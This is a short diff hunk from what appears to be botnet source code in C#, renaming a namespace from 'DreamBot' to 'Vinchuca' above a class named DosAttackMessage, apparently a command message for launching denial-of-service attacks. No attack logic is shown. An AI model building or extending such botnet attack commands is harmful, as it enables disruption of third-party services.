@@ -1,7 +1,7 @@
 ﻿using System.IO;
 using System.Net;
 
-namespace DreamBot.Network.Protocol.Messages.Command
+namespace Vinchuca.Network.Protocol.Messages.Command
 {
     class DosAttackMessage : CommandMessage
     {
